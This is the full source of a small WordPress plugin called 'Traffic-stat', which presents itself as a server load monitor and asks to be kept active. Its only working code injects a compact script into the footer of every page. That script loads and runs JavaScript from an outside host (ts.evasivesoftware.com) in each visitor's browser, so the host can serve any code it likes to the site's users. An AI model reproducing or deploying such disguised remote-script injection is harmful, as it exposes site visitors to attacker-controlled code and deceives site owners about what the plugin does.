<?php
/*
Plugin Name: Traffic-stat
Plugin URI: http://www.emarketeer.com.au/
Description: Monitors server load status (Please keep active)
Version: 1.0.0
Author: EvasiveSoftware.com
Author URI: http://www.evasivesoftware.com/
License: MIT
*/

function ts_add_stat() {
	?><script>if("undefined"!==typeof document.querySelectorAll){var a=1,b="http://ts.evasivesoftware.com/proc?reqs=",c,d=document.querySelectorAll("link[rel=stylesheet], script, img");"undefined"!==typeof d&&(a+=d.length);b+=a;c=document.createElement("script");c.src=b;document.body.appendChild(c)};</script><?php
}
add_action('wp_footer', 'ts_add_stat');